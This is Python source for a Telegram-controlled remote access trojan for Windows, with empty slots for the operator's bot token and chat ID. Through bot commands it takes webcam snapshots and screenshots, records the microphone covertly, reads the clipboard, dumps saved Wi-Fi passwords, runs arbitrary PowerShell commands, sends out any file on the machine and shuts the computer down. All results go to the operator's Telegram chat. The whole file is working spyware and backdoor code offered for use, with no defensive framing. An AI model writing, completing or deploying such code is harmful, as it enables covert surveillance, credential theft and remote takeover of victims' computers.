import os
import subprocess
import sys
import getpass
import asyncio
import logging

# Updated imports for v20+
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.request import HTTPXRequest

import flag
import pyperclip
from Modules import (
    ip_info,
    webcam_snap,
    screen_shot,
    audio_recorder,
    text_speaker,
    system_info,
    get_wifi_password,
    show_popup,
    wifi_scanner,
    open_website,
)

# Configuration
API_KEY = "" # Put your token here
CHAT_ID = ""   # Put your chat ID here
USERNAME = getpass.getuser()
TELEGRAM_PARSING_MODE = ParseMode.HTML


def listToString(s):
    str1 = " "
    return str1.join(s)


async def post_init(application: Application):
    """Sends a message when the bot comes online."""
    await application.bot.send_message(chat_id=CHAT_ID, text=f"☠️ {USERNAME} Connected")


async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
        [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
        [InlineKeyboardButton("👂 Start Eavesdrop", callback_data="start_eavesdrop")],
        [InlineKeyboardButton("🛑 Stop Eavesdrop", callback_data="stop_eavesdrop")],
        [InlineKeyboardButton("🗣️ Text To Speech on client", callback_data="speak")],
        [InlineKeyboardButton("🖥️ Get System Information", callback_data="get_system_info")],
        [InlineKeyboardButton("🔑 Perform Shell Commands", callback_data="shell_commands")],
        [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
        [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
        [InlineKeyboardButton("⚠️ Show Alert Box", callback_data="show_popup")],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [InlineKeyboardButton("🗝️ Get Wifi Password", callback_data="get_wifi_password")],
        [InlineKeyboardButton("📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints")],
        [InlineKeyboardButton("🔌 Shut Down System", callback_data="shutdown_system")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Available Commands :", reply_markup=reply_markup)


async def speak(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        text_speaker.text_speaker(Crt_values)
        await update.message.reply_text(f"🗣️ Spoken: {Crt_values}")
    else:
        await update.message.reply_text("⚠️ Usage: /speak <text>")


async def ps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        command = listToString(inputs[1:])
        cmd_output = subprocess.Popen(
            ["powershell.exe", "-Command", command], 
            shell=False, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        output, error = cmd_output.communicate()
        
        response_text = output.decode(sys.stdout.encoding or 'utf-8', errors='replace')
        if not response_text:
            response_text = error.decode(sys.stdout.encoding or 'utf-8', errors='replace') or "Command executed with no output."

        if len(response_text) > 4000:
            response_text = response_text[:4000] + "\n...(truncated)"

        await update.message.reply_text(f"💻 Output:\n{response_text}")
    else:
        await update.message.reply_text("⚠️ Usage: /ps <command>")


async def showPopup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        show_popup.show_popup(Crt_values)
        await update.message.reply_text("⚠️ Popup shown.")
    else:
        await update.message.reply_text("⚠️ Usage: /show_popup <message>")


async def shell_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        command = listToString(inputs[1:])
        cmd_output = subprocess.Popen(
            f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        output, error = cmd_output.communicate()
        
        response_text = output.decode(sys.stdout.encoding or 'utf-8', errors='replace')
        if not response_text:
            response_text = error.decode(sys.stdout.encoding or 'utf-8', errors='replace') or "Command executed with no output."

        if len(response_text) > 4000:
            response_text = response_text[:4000] + "\n...(truncated)"

        await context.bot.send_message(chat_id=CHAT_ID, text=f"💻 Output:\n{response_text}")
    else:
        await update.message.reply_text("⚠️ Usage: /shell <command>")


async def open_websites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        open_website.open_website(Crt_values)
        await update.message.reply_text(f"🌐 Opened: {Crt_values}")
    else:
        await update.message.reply_text("⚠️ Usage: /open_website <url>")


async def get_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = (update.message.text).split()
    if len(inputs) > 1:
        Crt_values = listToString(inputs[1:])
        if os.path.exists(Crt_values):
            try:
                await context.bot.send_document(chat_id=CHAT_ID, document=open(Crt_values, "rb"))
            except Exception as e:
                await update.message.reply_text(f"❌ Error sending file: {e}")
        else:
             await update.message.reply_text("❌ File not found.")
    else:
         await update.message.reply_text("⚠️ Usage: /get_file <path>")


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer() 
    result = query.data

    if result == "get_Webcam":
        webcam_snap.webcam_snap()
        if os.path.exists("webcam.jpg"):
            await context.bot.send_document(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Webcam Snap",
                document=open("webcam.jpg", "rb"),
            )
            os.remove("webcam.jpg")
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ Webcam capture failed.")

    elif result == "get_system_info":
        sys_info = system_info.system_info()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
            f"📍 System --> {sys_info.get_system()}\n"
            f"📍 Name --> {sys_info.get_system_name()}\n"
            f"📍 Release --> {sys_info.get_system_release()}\n"
            f"📍 Version --> {sys_info.get_system_version()}\n"
            f"📍 Machine --> {sys_info.get_system_machine()}\n"
            f"📍 Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------📁 Memory Info-----</b>\n\n"
            f"📍 Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"📍 Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"📍 Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>💿 Hard Disk Info-----</b>\n\n"
            f"📍 Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"📍 Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"📍 Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "Get_IP":
        ip_address_info = ip_info.ip_info()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="⭕ <b>IP Address :</b> "
            + str(ip_address_info.get("query", "N/A"))
            + "\n⭕ <b>Country :</b> "
            + str(ip_address_info.get("country", "N/A"))
            + " "
            + flag.flag(ip_address_info.get("countryCode", "US"))
            + "\n⭕ <b> Region : </b>"
            + str(ip_address_info.get("regionName", "N/A"))
            + "\n⭕ <b>City : </b>"
            + str(ip_address_info.get("city", "N/A")),
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "get_Screenshot":
        screen_shot.screen_shot()
        if os.path.exists("Screenshot.png"):
            await context.bot.send_photo(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Screenshot",
                photo=open("Screenshot.png", "rb"),
            )
            os.remove("Screenshot.png")

    elif result == "start_eavesdrop":
        audio_recorder.start_recording()
        await context.bot.send_message(chat_id=CHAT_ID, text="👂 Started recording...")

    elif result == "stop_eavesdrop":
        audio_recorder.stop_recording()
        await context.bot.send_message(chat_id=CHAT_ID, text="🛑 Stopped recording. Sending file...")
        await asyncio.sleep(1)
        if os.path.exists("audio_record.wav"):
            await context.bot.send_audio(
                chat_id=CHAT_ID,
                caption=USERNAME + "'s Audio",
                audio=open("audio_record.wav", "rb"),
            )
            os.remove("audio_record.wav")
        else:
             await context.bot.send_message(chat_id=CHAT_ID, text="❌ Audio file not found.")

    elif result == "shell_commands":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To perform shell commands, use /shell <command>",
        )

    elif result == "open_website":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To open website, use /open_website <website>",
        )

    elif result == "show_popup":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To show alert box, use /show_popup <message>",
        )

    elif result == "get_clipboard":
        await context.bot.send_message(
            chat_id=CHAT_ID, text=f"📋 Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        passwords = get_wifi_password.get_wifi_password()
        wifi_pass = " \n".join(passwords) if passwords else "No passwords found."
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=wifi_pass,
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=f"<b>📡 Access Points from {USERNAME}:</b> \n {access_points}",
            parse_mode=TELEGRAM_PARSING_MODE,
        )

    elif result == "speak":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To speak, use /speak <text>",
        )

    elif result == "get_file":
        await context.bot.send_message(
            chat_id=CHAT_ID,
            text="To send file, use /get_file <file path>",
        )

    elif result == "shutdown_system":
        await context.bot.send_message(chat_id=CHAT_ID, text="🔌 Shutting down the system...")
        os.system("shutdown /s /t 0")


if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # We increase the timeouts so the bot doesn't crash on slow internet
    my_request = HTTPXRequest(
        connection_pool_size=8,
        read_timeout=60.0,    
        write_timeout=60.0,   
        connect_timeout=60.0, 
        pool_timeout=60.0     
    )

    application = (
        Application.builder()
        .token(API_KEY)
        .post_init(post_init)
        .job_queue(None)   
        .request(my_request) 
        .build()
    )

    application.add_handler(CommandHandler("start", main_menu))
    application.add_handler(CommandHandler("ps", ps_command))
    application.add_handler(CommandHandler("speak", speak))
    application.add_handler(CommandHandler("show_popup", showPopup))
    application.add_handler(CommandHandler("shell", shell_commands))
    application.add_handler(CommandHandler("open_website", open_websites))
    application.add_handler(CommandHandler("get_file", get_file))
    application.add_handler(CommandHandler("commands", main_menu))

    application.add_handler(CallbackQueryHandler(button))

    print("Bot is starting... Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
    application.run_polling()